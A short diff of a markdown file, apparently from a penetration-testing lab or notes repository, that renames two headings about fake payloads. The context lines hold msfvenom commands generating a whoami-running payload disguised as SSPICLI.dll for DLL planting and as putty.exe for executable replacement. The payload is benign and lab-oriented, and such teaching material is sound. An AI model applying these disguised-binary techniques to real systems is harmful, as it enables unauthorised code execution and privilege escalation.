@@ -1,9 +1,9 @@
 ## Showcase
-### Fake Payload write (dll emplacement)
+### Fake Payload write permissions (dll emplacement)
     msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > c:\users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
 ____________________________________________________________________________________________________________________
 ## Showcase
-### Fake Payload rename (exe replacement)
+### Fake Payload rename permissions (exe replacement)
     msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > c:\users\student\Desktop\whoami.txt' -f exe > putty.exe
 ____________________________________________________________________________________________________________________
 ## 
